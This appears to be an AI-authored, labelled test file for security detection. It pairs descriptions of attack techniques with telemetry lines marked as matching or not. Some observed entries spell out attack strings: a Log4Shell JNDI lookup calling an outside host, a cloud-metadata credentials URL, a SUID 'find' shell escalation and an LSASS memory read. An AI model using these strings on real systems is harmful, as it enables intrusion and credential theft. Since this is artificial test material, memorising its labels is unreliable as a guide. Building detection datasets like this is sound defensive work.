@@ -1,0 +1,155 @@
+{
+ "_provenance": "authored by Claude Sonnet 5.5 in session 018aJ1P8 on 2026-10-07 (prompt: write analyst-style behaviour descriptions that name the technique's observable without using its ATT&CK name); expected-signal text = real SPL descriptions; observed telemetry authored (matched) or unrelated (not matched)",
+ "pairs": [
+  {
+   "expected": "Kerberoasting \u2014 Windows Security Event 4769 with RC4 encryption",
+   "observed": "Event 4769 requests for SQL service SPNs using RC4 (0x17) from a user workstation, 40 in 5 minutes",
+   "match": true
+  },
+  {
+   "expected": "Kerberoasting \u2014 Windows Security Event 4769 with RC4 encryption",
+   "observed": "Linux auditd execve records for apt update running nightly",
+   "match": false
+  },
+  {
+   "expected": "DCSync \u2014 Windows Security Event 4662 replication rights",
+   "observed": "Event 4662 with DS-Replication-Get-Changes from a non-DC machine account",
+   "match": true
+  },
+  {
+   "expected": "DCSync \u2014 Windows Security Event 4662 replication rights",
+   "observed": "Windows Update installed KB5030211 and rebooted the host",
+   "match": false
+  },
+  {
+   "expected": "Password spray \u2014 multiple 4625/4771 events from single source",
+   "observed": "one source IP generated 4625 failures against 300 distinct usernames within 10 minutes",
+   "match": true
+  },
+  {
+   "expected": "Password spray \u2014 multiple 4625/4771 events from single source",
+   "observed": "a printer fetched its firmware manifest over HTTPS",
+   "match": false
+  },
+  {
+   "expected": "LSASS dump \u2014 credential dumping via lsass.exe memory access",
+   "observed": "Sysmon event 10 shows procdump.exe opening lsass.exe with PROCESS_VM_READ",
+   "match": true
+  },
+  {
+   "expected": "LSASS dump \u2014 credential dumping via lsass.exe memory access",
+   "observed": "nightly backup agent copied the documents share to the NAS",
+   "match": false
+  },
+  {
+   "expected": "Scheduled task persistence \u2014 Windows Security Event 4698",
+   "observed": "Event 4698 created task 'Updater' running a binary from C:\\Users\\Public",
+   "match": true
+  },
+  {
+   "expected": "Scheduled task persistence \u2014 Windows Security Event 4698",
+   "observed": "DNS queries for the corporate intranet increased by 5 percent",
+   "match": false
+  },
+  {
+   "expected": "Container escape \u2014 host auditd + docker events",
+   "observed": "a container with CAP_SYS_ADMIN mounted /proc/1/root and wrote to the host's cron directory",
+   "match": true
+  },
+  {
+   "expected": "Container escape \u2014 host auditd + docker events",
+   "observed": "a user changed their desktop wallpaper",
+   "match": false
+  },
+  {
+   "expected": "Web exploit \u2014 access-log signatures (LFI/SQLi/Log4Shell/webshell markers)",
+   "observed": "access log shows GET /?x=${jndi:ldap://203.0.113.9/a} returning 200",
+   "match": true
+  },
+  {
+   "expected": "Web exploit \u2014 access-log signatures (LFI/SQLi/Log4Shell/webshell markers)",
+   "observed": "a scheduled job rotated syslog files at midnight",
+   "match": false
+  },
+  {
+   "expected": "Pass-the-hash \u2014 NTLM hash authentication",
+   "observed": "NTLM network logon type 3 for an administrator from a workstation that never used that account before, no Kerberos ticket",
+   "match": true
+  },
+  {
+   "expected": "Pass-the-hash \u2014 NTLM hash authentication",
+   "observed": "new employee onboarding created five standard user accounts",
+   "match": false
+  },
+  {
+   "expected": "Windows service creation \u2014 suspicious System 7045 service install",
+   "observed": "System event 7045: service 'xqtz' installed with image path in %TEMP%",
+   "match": true
+  },
+  {
+   "expected": "Windows service creation \u2014 suspicious System 7045 service install",
+   "observed": "an HVAC thermostat reported a temperature of 21 degrees",
+   "match": false
+  },
+  {
+   "expected": "Multi-factor authentication request abuse \u2014 repeated failed Okta MFA events",
+   "observed": "12 Okta push denials followed by an approval for one user within 15 minutes",
+   "match": true
+  },
+  {
+   "expected": "Multi-factor authentication request abuse \u2014 repeated failed Okta MFA events",
+   "observed": "the CEO's calendar had a conflict on Tuesday",
+   "match": false
+  },
+  {
+   "expected": "Data from Cloud Storage \u2014 read or copy of data held in cloud object storage",
+   "observed": "GetObject calls for 4 GB of bucket data by a role that had never listed the bucket",
+   "match": true
+  },
+  {
+   "expected": "Data from Cloud Storage \u2014 read or copy of data held in cloud object storage",
+   "observed": "the web server returned a 404 for /favicon.ico",
+   "match": false
+  },
+  {
+   "expected": "Cloud-metadata SSRF \u2014 169.254.169.254 access signal",
+   "observed": "app logs show an outbound request to http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+   "match": true
+  },
+  {
+   "expected": "Cloud-metadata SSRF \u2014 169.254.169.254 access signal",
+   "observed": "backup completed with 0 errors",
+   "match": false
+  },
+  {
+   "expected": "SUID abuse \u2014 setuid binary execution for privilege escalation",
+   "observed": "auditd shows a non-root user executing /usr/bin/find with -exec /bin/sh -p",
+   "match": true
+  },
+  {
+   "expected": "SUID abuse \u2014 setuid binary execution for privilege escalation",
+   "observed": "the DNS cache was flushed by an administrator",
+   "match": false
+  },
+  {
+   "expected": "AS-REP Roasting \u2014 Windows Security Event 4768 without pre-auth",
+   "observed": "Event 4768 with pre-authentication type 0 for user svc-legacy from an external host",
+   "match": true
+  },
+  {
+   "expected": "AS-REP Roasting \u2014 Windows Security Event 4768 without pre-auth",
+   "observed": "user changed the font size in the intranet portal",
+   "match": false
+  },
+  {
+   "expected": "WMI execution \u2014 remote command execution via WMI/cimv2",
+   "observed": "a remote host invoked Win32_Process Create through WmiPrvSE spawning cmd.exe",
+   "match": true
+  },
+  {
+   "expected": "WMI execution \u2014 remote command execution via WMI/cimv2",
+   "observed": "the badge reader logged an entry at 08:02",
+   "match": false
+  }
+ ]
+}
